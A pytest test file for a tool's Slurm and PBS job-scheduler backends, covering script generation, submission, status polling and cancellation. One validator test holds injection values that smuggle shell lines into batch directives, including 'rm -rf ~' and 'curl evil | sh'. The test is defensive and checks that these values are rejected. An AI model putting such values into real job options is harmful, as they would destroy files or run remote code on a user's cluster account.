import os
import stat
import subprocess
from datetime import UTC, datetime

import pytest
from pydantic import ValidationError

from typantic.web.backends.base import LaunchUncertainError, PollResult
from typantic.web.backends.pbs import (
    PbsBackend,
    _job_name,
    _to_int,
    _walltime,
)
from typantic.web.backends.scheduler import (
    SchedulerBackend,
    SchedulerError,
    SchedulerParams,
    _default_runner,
    first_nonempty_line,
)
from typantic.web.backends.slurm import SlurmBackend
from typantic.web.models import JobRecord, JobStatus


class FakeRunner:
    def __init__(self):
        self.calls = []
        self.responses = {}

    def set(self, tool, *, returncode=0, stdout="", stderr=""):
        self.responses[tool] = subprocess.CompletedProcess(
            [tool],
            returncode,
            stdout,
            stderr,
        )

    def __call__(self, argv):
        self.calls.append(argv)
        return self.responses.get(
            argv[0],
            subprocess.CompletedProcess(argv, 0, "", ""),
        )


def _record(job_dir, *, scheduler_id=None, status=JobStatus.QUEUED):
    return JobRecord(
        id="j",
        command_key="a/b",
        app="a",
        command="b",
        title="T",
        backend="slurm",
        job_dir=str(job_dir),
        config_path=str(job_dir / "c.json"),
        log_path=str(job_dir / "job.log"),
        scheduler_id=scheduler_id,
        status=status,
        created_at=datetime.now(UTC),
    )


ARGV = ["app", "run", "--config", "/jobs/j/c.json"]
FULL_OPTS = {
    "partition": "gpu",
    "gpus": 2,
    "cpus": 4,
    "mem": "16G",
    "time_minutes": 90,
    "extra": ["--nodes=1"],
}


# --- Slurm ---


def test_slurm_launch_writes_script_and_returns_id(tmp_path):
    runner = FakeRunner()
    runner.set("sbatch", stdout="12345\n")
    launched = SlurmBackend(runner).launch(
        ARGV,
        job_dir=tmp_path,
        log_path=tmp_path / "job.log",
        backend_options=FULL_OPTS,
    )
    assert launched.scheduler_id == "12345"
    assert launched.status is JobStatus.QUEUED
    script = (tmp_path / "submit.sh").read_text()
    for directive in (
        "#SBATCH --partition=gpu",
        "#SBATCH --gres=gpu:2",
        "#SBATCH --cpus-per-task=4",
        "#SBATCH --mem=16G",
        "#SBATCH --time=90",
        "#SBATCH --nodes=1",
    ):
        assert directive in script
    assert runner.calls[0] == [
        "sbatch",
        f"--job-name={tmp_path.name}",
        f"--output={tmp_path / 'job.log'}",
        f"--chdir={tmp_path}",
        "--parsable",
        str(tmp_path / "submit.sh"),
    ]


def test_slurm_launch_strips_cluster_suffix(tmp_path):
    runner = FakeRunner()
    runner.set("sbatch", stdout="777;clusterA\n")
    launched = SlurmBackend(runner).launch(
        ARGV,
        job_dir=tmp_path,
        log_path=tmp_path / "log",
        backend_options={},
    )
    assert launched.scheduler_id == "777"


def test_slurm_submit_failure_raises(tmp_path):
    runner = FakeRunner()
    runner.set("sbatch", returncode=1, stderr="boom")
    with pytest.raises(SchedulerError, match="Submission failed"):
        SlurmBackend(runner).launch(
            ARGV,
            job_dir=tmp_path,
            log_path=tmp_path / "log",
            backend_options={},
        )


def test_slurm_empty_job_id_raises(tmp_path):
    runner = FakeRunner()
    runner.set("sbatch", stdout="   \n")
    with pytest.raises(SchedulerError, match="did not return a job id"):
        SlurmBackend(runner).launch(
            ARGV,
            job_dir=tmp_path,
            log_path=tmp_path / "log",
            backend_options={},
        )


def test_slurm_poll_without_id_is_failed(tmp_path):
    assert SlurmBackend(FakeRunner()).poll(_record(tmp_path)).status is JobStatus.FAILED


@pytest.mark.parametrize(
    ("sacct", "status", "exit_code"),
    [
        # sacct prints "0:0" for a job that has not finished, so a non-terminal
        # state must report no exit code at all -- PollResult documents exit_code
        # as set "once finished", and the dashboard renders a 0 as "exit 0".
        ("RUNNING|0:0", JobStatus.RUNNING, None),
        ("PENDING|0:0", JobStatus.QUEUED, None),
        ("COMPLETED|0:0", JobStatus.DONE, 0),
        ("FAILED|1:0", JobStatus.FAILED, 1),
        ("CANCELLED by 1001|0:0", JobStatus.CANCELLED, 0),
        # The signal half: killed by SIGTERM / SIGKILL reads as 128 + signal,
        # the way a shell reports it; it used to read as exit 0.
        ("CANCELLED by 1001|0:15", JobStatus.CANCELLED, 143),
        ("FAILED|0:9", JobStatus.FAILED, 137),
        ("WEIRD|x:0", JobStatus.QUEUED, None),
        ("", JobStatus.QUEUED, None),
    ],
)
def test_slurm_poll_states(tmp_path, sacct, status, exit_code):
    runner = FakeRunner()
    runner.set("sacct", stdout=sacct)
    result = SlurmBackend(runner).poll(_record(tmp_path, scheduler_id="1"))
    assert result.status is status
    assert result.exit_code == exit_code


def test_slurm_poll_keeps_last_known_status_when_the_query_fails(tmp_path):
    # A failed query says nothing about the job. Reading its empty stdout as
    # "not in the queue" reported a dead cluster as QUEUED forever.
    runner = FakeRunner()
    runner.set("sacct", stdout="", returncode=127, stderr="sacct: not found")
    record = _record(tmp_path, scheduler_id="1", status=JobStatus.RUNNING)
    result = SlurmBackend(runner).poll(record)
    assert result.status is JobStatus.RUNNING


def test_slurm_poll_survives_a_missing_scheduler_tool(tmp_path):
    # Every listed job is refreshed on read, so an exception escaping poll()
    # would 500 the whole jobs list rather than degrade one row.
    def raising(argv):
        raise FileNotFoundError(2, "No such file or directory", argv[0])

    record = _record(tmp_path, scheduler_id="1", status=JobStatus.RUNNING)
    result = SlurmBackend(raising).poll(record)
    assert result.status is JobStatus.RUNNING


def test_slurm_cancel(tmp_path):
    runner = FakeRunner()
    SlurmBackend(runner).cancel(_record(tmp_path, scheduler_id="55"))
    assert ["scancel", "55"] in runner.calls


def test_slurm_cancel_without_id_is_noop(tmp_path):
    runner = FakeRunner()
    SlurmBackend(runner).cancel(_record(tmp_path))
    assert runner.calls == []


def test_slurm_preview_returns_script(tmp_path):
    preview = SlurmBackend(FakeRunner()).preview(
        ARGV,
        job_dir=tmp_path,
        log_path=tmp_path / "log",
        backend_options={"partition": "gpu"},
    )
    assert "\n#!/bin/bash\n#SBATCH --partition=gpu\n" in preview


# --- PBS ---


def test_pbs_launch_writes_script(tmp_path):
    runner = FakeRunner()
    runner.set("qsub", stdout="1234.pbs\n")
    launched = PbsBackend(runner).launch(
        ARGV,
        job_dir=tmp_path,
        log_path=tmp_path / "job.log",
        # PBS sizes are "16gb": "16G" is Slurm's spelling.
        backend_options={**FULL_OPTS, "mem": "16gb"},
    )
    assert launched.scheduler_id == "1234.pbs"
    script = (tmp_path / "submit.sh").read_text()
    assert "#PBS -q gpu" in script
    assert "#PBS -l select=1:ncpus=4:ngpus=2:mem=16gb" in script
    assert "#PBS -l walltime=01:30:00" in script
    assert "#PBS --nodes=1" in script
    assert runner.calls[0] == [
        "qsub",
        "-N",
        _job_name(tmp_path.name),
        "-o",
        str(tmp_path / "job.log"),
        "-j",
        "oe",
        str(tmp_path / "submit.sh"),
    ]


@pytest.mark.parametrize(
    ("qstat", "status", "exit_code"),
    [
        ("job_state = R", JobStatus.RUNNING, None),
        ("job_state = E", JobStatus.RUNNING, None),
        ("job_state = F\nExit_status = 0", JobStatus.DONE, 0),
        ("job_state = F\nExit_status = 3", JobStatus.FAILED, 3),
        # Torque spells it exit_status.
        ("job_state = C\nexit_status = 0", JobStatus.DONE, 0),
        ("job_state = Q", JobStatus.QUEUED, None),
        ("", JobStatus.QUEUED, None),
    ],
)
def test_pbs_poll_states(tmp_path, qstat, status, exit_code):
    runner = FakeRunner()
    runner.set("qstat", stdout=qstat)
    result = PbsBackend(runner).poll(_record(tmp_path, scheduler_id="1"))
    assert result.status is status
    assert result.exit_code == exit_code


def test_pbs_poll_without_id_is_failed(tmp_path):
    assert PbsBackend(FakeRunner()).poll(_record(tmp_path)).status is JobStatus.FAILED


def test_pbs_cancel(tmp_path):
    runner = FakeRunner()
    PbsBackend(runner).cancel(_record(tmp_path, scheduler_id="9.x"))
    assert ["qdel", "9.x"] in runner.calls


# --- helpers ---


def test_job_name_is_pbs_safe():
    name = _job_name("20260101-1200-abcdef99")
    assert name.startswith("j")
    assert name.isalnum()
    assert len(name) <= 15


def test_walltime_formatting():
    assert _walltime(5) == "00:05:00"
    assert _walltime(90) == "01:30:00"
    assert _walltime(125) == "02:05:00"


def test_to_int():
    assert _to_int("5") == 5
    assert _to_int("nope") is None


# --- shared params ---


def test_scheduler_params_validation():
    with pytest.raises(ValidationError):
        SchedulerParams(unknown=1)
    with pytest.raises(ValidationError):
        SchedulerParams(gpus=-1)
    with pytest.raises(ValidationError):
        SchedulerParams(cpus=0)


def test_scheduler_backends_expose_options_model():
    assert SlurmBackend().options_model is SchedulerParams
    assert PbsBackend().options_model is SchedulerParams


def test_pbs_launch_minimal_omits_optional_directives(tmp_path):
    runner = FakeRunner()
    runner.set("qsub", stdout="7.pbs\n")
    PbsBackend(runner).launch(
        ARGV,
        job_dir=tmp_path,
        log_path=tmp_path / "job.log",
        backend_options={},
    )
    script = (tmp_path / "submit.sh").read_text()
    assert "#PBS -q" not in script
    assert "select=1" not in script
    assert "walltime" not in script


def test_pbs_parse_qstat_ignores_non_kv_lines(tmp_path):
    runner = FakeRunner()
    runner.set("qstat", stdout="Job Id: 1.pbs\njob_state = R\n")
    result = PbsBackend(runner).poll(_record(tmp_path, scheduler_id="1"))
    assert result.status is JobStatus.RUNNING


def test_default_runner_runs_a_command():
    result = _default_runner(["true"])
    assert result.returncode == 0


def test_first_nonempty_line():
    assert first_nonempty_line("\n  \nfirst\nsecond") == "first"
    assert first_nonempty_line("") is None
    assert first_nonempty_line("  \n\t") is None


def test_slurm_unparsable_exit_code_is_none(tmp_path):
    # sacct can print a non-numeric ExitCode field; it must not crash the poll.
    runner = FakeRunner()
    runner.set("sacct", stdout="COMPLETED|weird")
    result = SlurmBackend(runner).poll(_record(tmp_path, scheduler_id="1"))
    assert result.status is JobStatus.DONE
    assert result.exit_code is None


def test_the_submit_script_is_private(tmp_path):
    runner = FakeRunner()
    runner.set("sbatch", stdout="1\n")
    SlurmBackend(runner).launch(
        ARGV, job_dir=tmp_path, log_path=tmp_path / "job.log", backend_options={}
    )
    assert stat.S_IMODE((tmp_path / "submit.sh").stat().st_mode) == 0o600


def test_a_submission_that_timed_out_may_have_queued(tmp_path):
    # sbatch can hang after the controller accepted the job; the launcher keeps
    # the folder for a job that may run.
    def hangs(argv):
        raise subprocess.TimeoutExpired(argv, 30)

    with pytest.raises(LaunchUncertainError, match="may have been queued"):
        SlurmBackend(hangs).launch(
            ARGV, job_dir=tmp_path, log_path=tmp_path / "job.log", backend_options={}
        )


@pytest.mark.parametrize("backend", [SlurmBackend, PbsBackend])
def test_a_refused_cancel_is_reported(tmp_path, backend):
    # A failed scancel/qdel was ignored, and the job recorded CANCELLED while it
    # kept running.
    runner = FakeRunner()
    runner.set("scancel", returncode=1, stderr="Invalid job id specified")
    runner.set("qdel", returncode=35, stderr="qdel: Unknown Job Id")
    with pytest.raises(SchedulerError, match="Cancel failed"):
        backend(runner).cancel(_record(tmp_path, scheduler_id="55"))


# --- scheduler control arguments and directives ---


@pytest.mark.parametrize("backend", [SlurmBackend, PbsBackend])
def test_a_jobs_path_with_a_space_stays_one_argument(tmp_path, backend):
    # The job's log and folder were written unquoted into #SBATCH / #PBS lines;
    # as submit arguments they need no quoting at all.
    job_dir = tmp_path / "my jobs" / "j1"
    job_dir.mkdir(parents=True)
    runner = FakeRunner()
    runner.set("sbatch", stdout="1\n")
    runner.set("qsub", stdout="1.pbs\n")
    backend(runner).launch(
        ARGV, job_dir=job_dir, log_path=job_dir / "job.log", backend_options={}
    )
    submit = runner.calls[0]
    assert any(arg.endswith(str(job_dir / "job.log")) for arg in submit)
    script = (job_dir / "submit.sh").read_text()
    assert "--output" not in script
    assert "#PBS -o" not in script


@pytest.mark.parametrize(
    "options",
    [
        {"partition": "gpu\n#SBATCH --uid=0"},
        {"partition": "gpu\ntouch /tmp/pwned"},
        {"partition": "a b"},
        {"partition": "gpu#x"},
        {"mem": "16G\nrm -rf ~"},
        {"extra": ["--nodes=1\ncurl evil | sh"]},
        {"extra": ["--nodes=1\r"]},
    ],
)
def test_a_directive_cannot_smuggle_in_a_script_line(options):
    # Each option becomes a line of the batch script, which runs as the user on
    # the cluster: a newline in one would start a shell command.
    with pytest.raises(ValidationError):
        SchedulerParams.model_validate(options)


def test_directives_that_are_one_line_are_accepted():
    params = SchedulerParams.model_validate(
        {"partition": "gpu-a100", "mem": "16gb", "extra": ["--comment=a b # c"]}
    )
    assert params.extra == ["--comment=a b # c"]


@pytest.mark.parametrize(
    ("backend", "tool"), [(SlurmBackend, "sbatch"), (PbsBackend, "qsub")]
)
def test_the_preview_shows_the_submit_command(tmp_path, backend, tool):
    preview = backend(FakeRunner()).preview(
        ARGV, job_dir=tmp_path, log_path=tmp_path / "job.log", backend_options={}
    )
    first, _, script = preview.partition("\n")
    assert first.startswith(f"# Submitted with: {tool} ")
    assert first.endswith(str(tmp_path / "submit.sh"))
    assert str(tmp_path / "job.log") in first
    assert script.startswith("#!/bin/bash")


def test_a_scheduler_subclass_without_control_args_submits_as_before(tmp_path):
    # A third-party scheduler written against the old hooks keeps its own
    # submit command and directives untouched.
    class Lsf(SchedulerBackend):
        def _directives(self, params, *, job_dir, log_path):
            return [f"#BSUB -o {log_path}"]

        def _submit_command(self, script_path):
            return ["bsub", str(script_path)]

        def _parse_submit(self, stdout):
            return stdout.strip()

        def _status_command(self, job_id):
            return ["bjobs", job_id]

        def _parse_status(self, stdout):
            return PollResult(status=JobStatus.QUEUED)

        def _cancel_command(self, job_id):
            return ["bkill", job_id]

    runner = FakeRunner()
    runner.set("bsub", stdout="77\n")
    Lsf(runner).launch(
        ARGV, job_dir=tmp_path, log_path=tmp_path / "job.log", backend_options={}
    )
    assert runner.calls[0] == ["bsub", str(tmp_path / "submit.sh")]
    assert f"#BSUB -o {tmp_path / 'job.log'}" in (tmp_path / "submit.sh").read_text()
    # A failed query, with no way to tell a forgotten job: the last status holds.
    runner.set("bjobs", returncode=255, stderr="Job <77> is not found")
    record = _record(tmp_path, scheduler_id="77", status=JobStatus.RUNNING)
    assert Lsf(runner).poll(record).status is JobStatus.RUNNING


# --- a scheduler job finishes even when the scheduler forgets it ---


class Clock:
    def __init__(self):
        self.now = 1000.0

    def __call__(self):
        return self.now


@pytest.fixture
def clock(monkeypatch):
    from typantic.web.backends import scheduler as scheduler_mod  # noqa: PLC0415

    now = Clock()
    monkeypatch.setattr(scheduler_mod.time, "monotonic", now)
    return now


@pytest.mark.parametrize("backend", [SlurmBackend, PbsBackend])
def test_the_batch_script_leaves_its_exit_code(tmp_path, backend):
    runner = FakeRunner()
    runner.set("sbatch", stdout="1\n")
    runner.set("qsub", stdout="1.pbs\n")
    (tmp_path / ".typantic-exit").write_text("0\n")  # a previous run's
    backend(runner).launch(
        ARGV, job_dir=tmp_path, log_path=tmp_path / "job.log", backend_options={}
    )
    assert not (tmp_path / ".typantic-exit").exists()
    script = (tmp_path / "submit.sh").read_text()
    marker = tmp_path / ".typantic-exit"
    assert script.endswith(f'rc=$?\necho "$rc" > {marker}\nexit "$rc"\n')


def test_a_finished_job_is_read_from_its_marker_first(tmp_path):
    # Without accounting (sacct refuses) a finished job was never seen to finish.
    runner = FakeRunner()
    runner.set("sacct", returncode=1, stderr="accounting storage is disabled")
    (tmp_path / ".typantic-exit").write_text("3\n")
    record = _record(tmp_path, scheduler_id="1", status=JobStatus.RUNNING)
    result = SlurmBackend(runner).poll(record)
    assert (result.status, result.exit_code) == (JobStatus.FAILED, 3)
    assert runner.calls == []


def test_slurm_without_accounting_asks_squeue(tmp_path):
    runner = FakeRunner()
    runner.set("sacct", returncode=1, stderr="accounting storage is disabled")
    runner.set("squeue", stdout="RUNNING\n")
    record = _record(tmp_path, scheduler_id="1", status=JobStatus.QUEUED)
    assert SlurmBackend(runner).poll(record).status is JobStatus.RUNNING
    assert runner.calls[-1][:3] == ["squeue", "-j", "1"]


def test_slurm_asks_squeue_for_a_job_accounting_has_not_seen_yet(tmp_path):
    runner = FakeRunner()
    runner.set("sacct", stdout="")
    runner.set("squeue", stdout="PENDING\n")
    record = _record(tmp_path, scheduler_id="1", status=JobStatus.QUEUED)
    assert SlurmBackend(runner).poll(record).status is JobStatus.QUEUED


def test_slurm_keeps_the_last_status_when_squeue_cannot_answer(tmp_path):
    runner = FakeRunner()
    runner.set("sacct", returncode=1, stderr="accounting storage is disabled")
    runner.set("squeue", returncode=1, stderr="Unable to contact slurm controller")
    record = _record(tmp_path, scheduler_id="1", status=JobStatus.RUNNING)
    assert SlurmBackend(runner).poll(record).status is JobStatus.RUNNING


def _gone_slurm():
    runner = FakeRunner()
    runner.set("sacct", returncode=1, stderr="accounting storage is disabled")
    runner.set("squeue", returncode=1, stderr="Invalid job id specified")
    return runner


def _gone_pbs():
    runner = FakeRunner()
    runner.set("qstat", returncode=153, stderr="qstat: Unknown Job Id 1.pbs")
    return runner


def _finished_pbs():
    runner = FakeRunner()
    runner.set("qstat", stdout="job_state = F\n")  # no exit status recorded
    return runner


def _empty_squeue():
    runner = FakeRunner()
    runner.set("sacct", returncode=1, stderr="accounting storage is disabled")
    runner.set("squeue", stdout="")
    return runner


@pytest.mark.parametrize(
    ("backend", "runner"),
    [
        (SlurmBackend, _gone_slurm),
        (SlurmBackend, _empty_squeue),
        (PbsBackend, _gone_pbs),
        (PbsBackend, _finished_pbs),
    ],
)
def test_a_job_the_scheduler_forgot_fails_after_a_grace_period(
    tmp_path, clock, backend, runner
):
    # It stayed RUNNING forever. The grace period is for the exit marker, which
    # a shared filesystem can show the login node a little late.
    scheduler = backend(runner())
    record = _record(tmp_path, scheduler_id="1", status=JobStatus.RUNNING)
    assert scheduler.poll(record).status is JobStatus.RUNNING
    clock.now += 60
    assert scheduler.poll(record).status is JobStatus.RUNNING
    clock.now += 120
    assert scheduler.poll(record).status is JobStatus.FAILED


def test_a_marker_that_shows_up_late_still_counts(tmp_path, clock):
    scheduler = SlurmBackend(_gone_slurm())
    record = _record(tmp_path, scheduler_id="1", status=JobStatus.RUNNING)
    assert scheduler.poll(record).status is JobStatus.RUNNING
    clock.now += 30
    (tmp_path / ".typantic-exit").write_text("0\n")
    result = scheduler.poll(record)
    assert (result.status, result.exit_code) == (JobStatus.DONE, 0)


def test_a_job_seen_again_starts_its_grace_period_over(tmp_path, clock):
    runner = _gone_slurm()
    scheduler = SlurmBackend(runner)
    record = _record(tmp_path, scheduler_id="1", status=JobStatus.RUNNING)
    scheduler.poll(record)  # gone: the grace period starts
    clock.now += 170
    runner.set("squeue", stdout="RUNNING\n")  # a slow controller answered after all
    assert scheduler.poll(record).status is JobStatus.RUNNING
    runner.set("squeue", returncode=1, stderr="Invalid job id specified")
    clock.now += 20
    assert scheduler.poll(record).status is JobStatus.RUNNING


def test_pbs_keeps_the_last_status_when_qstat_cannot_answer(tmp_path):
    runner = FakeRunner()
    runner.set("qstat", returncode=1, stderr="Connection refused")
    record = _record(tmp_path, scheduler_id="1", status=JobStatus.RUNNING)
    assert PbsBackend(runner).poll(record).status is JobStatus.RUNNING


def test_a_finished_scheduler_job_reports_when_it_finished(tmp_path):
    marker = tmp_path / ".typantic-exit"
    marker.write_text("0\n")
    ended = datetime(2026, 9, 20, 3, 14, 15, tzinfo=UTC)
    os.utime(marker, (ended.timestamp(), ended.timestamp()))
    record = _record(tmp_path, scheduler_id="1", status=JobStatus.RUNNING)
    assert SlurmBackend(FakeRunner()).poll(record).finished_at == ended
